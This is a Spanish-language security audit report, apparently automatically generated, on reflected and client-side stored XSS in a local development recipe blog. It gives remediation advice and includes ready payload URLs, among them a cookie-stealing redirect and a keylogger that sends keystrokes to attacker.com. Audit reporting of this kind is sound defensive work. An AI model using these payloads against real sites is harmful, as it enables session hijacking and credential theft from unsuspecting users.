# Informe de Auditoría de Seguridad - Cross-Site Scripting (XSS)

**Fecha:** 2026-04-30 16:20:49  
**Objetivo:** http://web.dev.local:8082  
**Tipo de análisis:** Cross-Site Scripting (XSS)  
**Estado:** Vulnerabilidades encontradas y explotadas

---

## Resumen Ejecutivo

Se realizó un análisis de seguridad sobre la aplicación web "Blog de Recetas" alojada en `http://web.dev.local:8082`. Se identificaron **dos vulnerabilidades XSS** de severidad alta: una de tipo **Reflected XSS** y una de tipo **Stored XSS (client-side)**. Ambas vulnerabilidades se deben al uso inseguro de `document.write()` con datos no sanitizados provenientes del usuario.

---

## Descripción de la Aplicación

La aplicación es un blog de recetas que presenta:
- **Buscador de recetas**: formulario GET con parámetro `search`
- **Sección de comentarios**: formulario GET con parámetros `name` y `comment`, almacenamiento en `localStorage`

---

## Vulnerabilidades Encontradas

### 1. Reflected XSS — Parámetro `search`

**Severidad:** Alta  
**Tipo:** Reflected Cross-Site Scripting  
**Parámetro vulnerable:** `search` (GET)

#### Descripción

El código JavaScript del lado del cliente lee el parámetro `search` de la URL y lo inyecta directamente en `document.write()` sin ningún tipo de sanitización ni codificación:

```javascript
const searchTerm = urlParams.get('search');
if (searchTerm) {
    document.write('<p>Resultados para: <strong>' + searchTerm + '</strong></p>');
}
```

#### Explotación

Un atacante puede construir una URL maliciosa que, al ser visitada por una víctima, ejecute código JavaScript arbitrario en su navegador:

**Payload básico:**
```
http://web.dev.local:8082/?search=<script>alert('XSS')</script>
```

**Payload con robo de cookies:**
```
http://web.dev.local:8082/?search=<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
```

**Payload con `img` tag (bypass de filtros):**
```
http://web.dev.local:8082/?search=<img src=x onerror=alert('XSS')>
```

#### Impacto

- Robo de cookies de sesión
- Redirección a sitios maliciosos
- Ejecución de acciones en nombre del usuario
- Defacement visual de la página para la víctima

---

### 2. Stored XSS (Client-Side) — Parámetros `name` y `comment`

**Severidad:** Alta  
**Tipo:** Stored Cross-Site Scripting (vía `localStorage`)  
**Parámetros vulnerables:** `name` y `comment` (GET)

#### Descripción

Los comentarios se almacenan en `localStorage` sin sanitización y se renderizan mediante `document.write()`:

```javascript
const name = urlParams.get('name');
const comment = urlParams.get('comment');
// Se almacena sin sanitizar
comments.push({ name: name, comment: comment, date: new Date().toLocaleString() });
localStorage.setItem('comments', JSON.stringify(comments));

// Se renderiza sin sanitizar
document.write('<div class="comment-author">' + c.name + '</div>');
document.write('<div>' + c.comment + '</div>');
```

#### Explotación

Un atacante puede inyectar un payload XSS a través del formulario de comentarios. El payload queda almacenado en `localStorage` y se ejecuta cada vez que el usuario carga la página:

**URL de explotación:**
```
http://web.dev.local:8082/?name=Atacante&comment=<script>alert('Stored XSS')</script>
```

**Payload persistente de keylogger:**
```
http://web.dev.local:8082/?name=Test&comment=<script>document.onkeypress=function(e){new Image().src='http://attacker.com/log?k='+e.key}</script>
```

#### Impacto

- Ejecución persistente de código malicioso en el navegador del usuario afectado
- El payload se activa en cada visita hasta que se limpie el `localStorage`
- Posibilidad de captura de credenciales, tokens y datos sensibles

---

## Evidencia Técnica

### Confirmación de la vulnerabilidad (Reflected XSS)

Solicitud HTTP:
```
GET /?search=<script>alert(1)</script> HTTP/1.1
Host: web.dev.local:8082
```

El servidor responde con el payload embebido directamente en el JavaScript del cliente sin codificación, confirmando la vulnerabilidad.

---

## Vectores de Ataque

| Vector | Tipo | Parámetro | CVSS (aprox.) |
|--------|------|-----------|---------------|
| URL con `search` malicioso | Reflected XSS | `search` | 7.4 (Alto) |
| Formulario de comentarios | Stored XSS | `name`, `comment` | 8.0 (Alto) |

---

## Recomendaciones

### 1. Sanitización de entrada / Codificación de salida

Nunca insertar datos del usuario directamente en el DOM. Usar funciones de escape:

```javascript
function escapeHtml(text) {
    const div = document.createElement('div');
    div.appendChild(document.createTextNode(text));
    return div.innerHTML;
}

// Uso seguro:
document.write('<p>Resultados para: <strong>' + escapeHtml(searchTerm) + '</strong></p>');
```

### 2. Evitar `document.write()`

Reemplazar `document.write()` por manipulación segura del DOM mediante `textContent` o `createElement`:

```javascript
const p = document.createElement('p');
p.textContent = 'Resultados para: ' + searchTerm;
resultDiv.appendChild(p);
```

### 3. Implementar Content Security Policy (CSP)

Añadir la cabecera HTTP:
```
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';
```

### 4. Validación en servidor

Aunque esta aplicación procesa datos en el cliente, en un contexto real se debe validar y sanitizar toda entrada en el servidor antes de persistirla o devolverla al cliente.

---

## Conclusión

La aplicación `http://web.dev.local:8082` presenta vulnerabilidades XSS críticas tanto de tipo reflected como stored. El vector de ataque es trivial: basta con construir una URL especialmente crafteada y compartirla con la víctima. Se recomienda aplicar las medidas correctivas descritas antes de poner la aplicación en producción.

---

*Informe generado automáticamente durante auditoría de seguridad autorizada.*
